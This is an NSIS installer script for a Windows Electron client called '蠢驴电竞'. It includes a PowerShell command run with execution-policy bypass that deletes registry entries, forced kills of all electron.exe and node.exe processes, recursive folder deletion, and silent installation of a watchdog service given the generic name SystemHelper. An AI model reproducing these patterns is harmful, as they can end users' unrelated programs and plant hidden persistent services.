; Force install directory to use product name (蠢驴电竞), not package name (@chunlvcompanion-electron)
!macro preInit
  StrCpy $INSTDIR "$PROGRAMFILES64\${APP_PRODUCT_FILENAME}"
!macroend

; Override ALL app-running check macros
!macro customCheckAppRunning
  ; no-op
!macroend
!macro checkIfAppRunning
  ; no-op
!macroend

!macro customInit
  ; ── Step 0: Nuke the old uninstall registry entry so uninstallOldVersion can't find it ──
  DeleteRegKey HKLM "${UNINSTALL_REGISTRY_KEY}"
  DeleteRegKey HKLM "${INSTALL_REGISTRY_KEY}"
  DeleteRegKey HKCU "${UNINSTALL_REGISTRY_KEY}"
  DeleteRegKey HKCU "${INSTALL_REGISTRY_KEY}"
  ; Brute-force backup: search Windows uninstall registry for "蠢驴电竞" and delete
  nsExec::ExecToLog 'powershell -NoProfile -ExecutionPolicy Bypass -Command "$$k=@(''HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall'',''HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall'');foreach($$p in $$k){gci $$p -ea 0|%%{$$n=(gp $$_.PSPath -Name DisplayName -ea 0).DisplayName;if($$n -and ($$n -match ''蠢驴'')){remove-item $$_.PSPath -Recurse -Force -ea 0;write-host ''deleted: $$n''}}}"'

  ; ── Step 1: Kill all related processes ──
  nsExec::ExecToLog 'cmd /c "taskkill /f /fi \"IMAGENAME eq 蠢驴电竞.exe\" /t 2>nul & taskkill /f /fi \"IMAGENAME eq electron.exe\" /t 2>nul & taskkill /f /fi \"IMAGENAME eq node.exe\" /t 2>nul & taskkill /f /fi \"IMAGENAME eq cmd.exe\" /fi \"WINDOWTITLE eq 蠢驴*\" /t 2>nul"'
  Sleep 3000

  ; ── Step 2: Delete old install files ──
  Delete "$INSTDIR\Uninstall 蠢驴电竞.exe"
  Delete "$PROGRAMFILES64\蠢驴电竞\Uninstall 蠢驴电竞.exe"
  Delete "$PROGRAMFILES\蠢驴电竞\Uninstall 蠢驴电竞.exe"
  Delete "$LOCALAPPDATA\Programs\蠢驴电竞\Uninstall 蠢驴电竞.exe"
  RMDir /r "$INSTDIR"
  RMDir /r "$PROGRAMFILES64\蠢驴电竞"
  RMDir /r "$PROGRAMFILES\蠢驴电竞"
  Delete "$APPDATA\蠢驴电竞\*.*"
  RMDir "$APPDATA\蠢驴电竞"
  Delete "$LOCALAPPDATA\蠢驴电竞\*.*"
  RMDir "$LOCALAPPDATA\蠢驴电竞"

  ; ── Step 3: Kill again after cleanup ──
  nsExec::ExecToLog 'cmd /c "taskkill /f /fi \"IMAGENAME eq 蠢驴电竞.exe\" /t 2>nul"'
  Sleep 1000
!macroend

; If the old uninstaller somehow still runs and fails, suppress the error
!macro customUnInstallCheck
  ClearErrors
  StrCpy $R0 0
!macroend
!macro customUnInstallCheckCurrentUser
  ClearErrors
  StrCpy $R0 0
!macroend

; 安装陪玩客户端时一并安装看门狗服务 SystemHelper
!macro customInstall
  nsExec::ExecToLog 'sc stop SystemHelper'
  Sleep 2000
  nsExec::ExecToLog 'sc delete SystemHelper'
  Sleep 1000
  CreateDirectory "$PROGRAMFILES64\SystemHelper"
  CopyFiles /SILENT "$INSTDIR\resources\SystemHelper.exe" "$PROGRAMFILES64\SystemHelper\SystemHelper.exe"
  nsExec::ExecToLog '"$PROGRAMFILES64\SystemHelper\SystemHelper.exe" install'
  nsExec::ExecToLog 'sc start SystemHelper'
!macroend
